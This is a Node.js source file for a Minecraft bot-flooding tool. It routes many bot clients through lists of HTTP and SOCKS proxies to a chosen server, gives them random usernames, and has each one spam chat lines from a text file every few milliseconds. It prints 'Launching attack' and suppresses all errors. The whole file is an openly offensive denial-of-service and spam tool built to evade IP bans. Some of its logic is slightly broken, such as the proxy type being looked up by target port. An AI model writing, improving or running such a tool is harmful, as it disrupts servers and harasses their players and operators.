//node index.js --host <ip> --port <port> --username true --version 1.8.8 --speed 120

const mc = require('minecraft-protocol')
const Http = require('http')
const socks = require('socks')
const readline = require('readline')
const crypto = require('crypto')
const fs = require('fs')
var async = require('async')
var argv = require('minimist')(process.argv.slice(2));

var proxy_array = []
var usernames = []

const host = getCommandArgument("host", "127.0.0.1")
const port = getCommandArgument("port", "25565")
const username = getCommandArgument("username", "true")
const version_server = getCommandArgument("version", "1.8.8")
const speedt = getCommandArgument("speed", "120")

/**
Identifiy proxies
**/
var proxy_type = {
  //HTTP port
  "80": "HTTP",
  "81": "HTTP",
  "8080": "HTTP",
  "3128": "HTTP",
  "8118": "HTTP",
  "808": "HTTP",
  "443": "HTTP",
  "8888": "HTTP",
  "57396": "HTTP",
  "37807": "HTTP",
  "56939": "HTTP",
  "999": "HTTP",

  //SOCKS port
  "1080": "SOCKS",
  "1081": "SOCKS",
  "8081": "SOCKS",
  "6667": "SOCKS",
  "7302": "SOCKS",
  "9999": "SOCKS",
  "25307": "SOCKS"
}

/**
Ignore error
*/
var error = false;
var error_socks = false;
process.on('uncaughtException', function (err) {
    error = true;
});

/**
Load username
*/
readline.createInterface({
    input: fs.createReadStream('usernames.txt'),
    console: false
}).on('line', function(line) {
    usernames.push(line);
});

/**
Load proxies
*/
const readInterface = readline.createInterface({
    input: fs.createReadStream('proxy.txt'),
    console: false
});

readInterface.on('line', function(line) {
    proxy_array.push(line);
});

readInterface.on('close', function(line) {

    if(proxy_array.length == 0){
        console.log("Please load proxies!")
        return
    }

		console.log()
		console.log("----------------------------")
		console.log("Launching attack to "+host+":"+port +' in '+version_server)
		console.log("Loaded proxies: "+proxy_array.length)
		console.log("Use username: "+username)
		console.log("Speed: "+speedt)
		console.log("----------------------------")
		console.log()

		setInterval(() => {
      async.eachSeries(proxy_array, function (element, next) {
  			setTimeout(function() {
    					error = false
              error_socks = false

    					var splitted = element.split(':')
    					var proxyHost = splitted[0]
    					var proxyPort = splitted[1]

    					connectToServer(proxyHost, proxyPort, host, port, genUsername(Math.floor((Math.random() * 12) + 4)))

    					next()
  			}, speedt)
		}, function () {
  			console.log()
  			console.log("----------------------------")
  			console.log('All joined')
  			console.log("----------------------------")
  			console.log()
		});
    },5500)
});

function connectToServer(proxyHost, proxyPort, host, port, name_player) {

    var proxyType = proxy_type[port]

    if(typeof proxyType === 'undefined' || proxyType === "HTTP"){

        //Prepare client with http proxy
        var client = mc.createClient({
            connect: (client) => {

                //Make the http connection
                var req = Http.request({
                    host: proxyHost,
                    port: proxyPort,
                    method: 'CONNECT',
                    path: host + ':' + parseInt(port),
                    timeout: 1200
                })

                //Return on any error
                client.on('error', function (err) {
                    return;
                })

                req.end()

                if(!error){
                    req.on('connect', function (res, stream) {
                        client.setSocket(stream)
                        client.emit('connect')
                    })
                }

            },
            username: name_player,
            version: version_server
        })
    }else if(proxyType === "SOCKS"){

        //Prepare client with socks proxy
        const client = mc.createClient({
            connect: client => {
                socks.createConnection({
                    proxy: {
                        ipaddress: proxyHost,
                        port: proxyPort,
                        type: 4
                    },
                    target: {
                        host: host,
                        port: parseInt(port)
                    },
                    timeout: 1200
                }, function (err, socket) {

                    if (err) {
                        error_socks = true
                        return
                    }

                    if(!error_socks){
                        client.setSocket(socket)
                        client.emit('connect')
                    }

                })
            },
            username: name_player,
            version: version_server
        })

    }
    if(error_socks)return
    if(!client)return

  	client.on('kick_disconnect', function (packet) {
  	     console.info('['+client.username+'] kicked for ' + getFormatedText(packet.reason))
  	})

  	client.on('disconnect', function (packet) {
  	     console.info('['+client.username+'] disconnect [' + getFormatedText(packet.reason)+']')
  	})

    client.cq = [];

    client.c = (...m) => client.cq.push(m.join(" "));

  	client.on('state', function (newState) {
        var state = ""+newState;

        if(state === "play"){

            console.log("["+client.username+"] "+" Connected !");
            setTimeout(() => {
                setInterval(() => {
                        require('fs').readFileSync('./Chat.txt').toString().split('\n').forEach(str => {
                                client.c(str)
                        })
                        
                },50)
        },150)
        setInterval(() => {
          if (!client.cq.at(0)) return;
          console.log(client.cq)
          client.write('chat', {message:client.cq[0].replace(/%username%/g, client.username).trim()})
          client.cq.shift();
        }, 20)
        }
  	})

  	client.on('end', function () {
        console.log('['+client.username+'] Connection lost')
  	})
}

function processMsg(data) {
    if (
      typeof data.text == "undefined" &&
      typeof data.translate !== "undefined" && 
      !(typeof data == 'string')
    ) {
      var msg = "";
  
      var translate = translations[data.translate] || data.translate;
  
      var withdata = [];
  
      if (typeof data.with !== "undefined")
        data.with.forEach(data => {
          //   console.log(data)
          withdata.push(processMsg(data));
        });
  
  
      if (typeof data.text == "undefined") data.text = "";
      if (typeof data.color == "undefined") data.color = "reset";
      if (typeof data.bold == "undefined") data.bold = false;
      if (typeof data.obfuscated == "undefined") data.obfuscated = false;
      if (typeof data.underlined == "undefined") data.underlined = false;
      if (typeof data.italic == "undefined") data.italic = false;
      if (typeof data.strikethrough == "undefined") data.strikethrough = false;
  
      var color = getColor(data.color);
      var bold = data.bold == true ? "§l" : "";
      var obfuscated = data.obfuscated == true ? "§k" : "";
      var underlined = data.underlined == true ? "§n" : "";
      var italic = data.italic == true ? "§o" : "";
      var strikethrough = data.strikethrough == true ? "§m" : "";
  

      for(var i = 0;i<(translate.match(/%s/g) || []).length+1;i++){
        var replace = typeof withdata[i] !== 'undefined'?withdata[i]:"";
        translate = translate.replace('%s',replace+color +
        bold +
        obfuscated +
        underlined +
        italic +
        strikethrough)    
    }

  
      var msg =
        color +
        bold +
        obfuscated +
        underlined +
        italic +
        strikethrough + translate
  
       if (typeof data.extra !== "undefined")
        data.extra.forEach(data => {
          msg = msg + processMsg(data);
        });
      //   console.log(msg)
        return msg;
  
        
    } else if (typeof data == 'string') {
  
        return data;
    } else {
      if (typeof data.text == "undefined") data.text = "";
      if (typeof data.color == "undefined") data.color = "reset";
      if (typeof data.bold == "undefined") data.bold = false;
      if (typeof data.obfuscated == "undefined") data.obfuscated = false;
      if (typeof data.underlined == "undefined") data.underlined = false;
      if (typeof data.italic == "undefined") data.italic = false;
      if (typeof data.strikethrough == "undefined") data.strikethrough = false;
  
      var color = getColor(data.color);
      var bold = data.bold == true ? "§l" : "";
      var obfuscated = data.obfuscated == true ? "§k" : "";
      var underlined = data.underlined == true ? "§n" : "";
      var italic = data.italic == true ? "§o" : "";
      var strikethrough = data.strikethrough == true ? "§m" : "";
  

      var msg =
        color +
        bold +
        obfuscated +
        underlined +
        italic +
        strikethrough +
        data.text;
  
      if (typeof data.extra !== "undefined")
        data.extra.forEach(data => {
          msg = msg + processMsg(data);
        });
  
      return msg;
    }
  }
const colors = [
  "r",
  "f",
"0",
 "c",
 "4",
"a",
"2",
 "d",
 "5",
   "9",
 "1",
 "b",
 "3",
 "6",
 "e",
 "7",
 "8"
]
function getColor(cl) {
  return colors[cl] == undefined ? "" : colors[cl];
}

function genUsername(length) {

    let random = usernames[Math.floor(Math.random()*usernames.length)]

    if(username === "true"){
        return random + crypto.randomBytes(6).toString('hex')
    }

    return crypto.createHash('md5').update(random).digest("hex").substring(1, 15)

}

function getFormatedText(texts){

    var titi = JSON.stringify(JSON.parse(texts).extra);

    titi = titi.substr(1);
    titi = titi.substring(0, titi.length - 1)

    var final_text = "";

    titi.split(',').forEach(function(element) {
        if(element.includes("text")){
            final_text+=element.replace('"text":"', '').replace('"}', '');
        }
    });

    return final_text;
}

function getCommandArgument(argument, default_arg){
    if (argument){
        let argss = argv[argument];
        if (!argv[argument]){
            return default_arg
        }
        return argv[argument]
    }else{
        return default_arg
    }
}
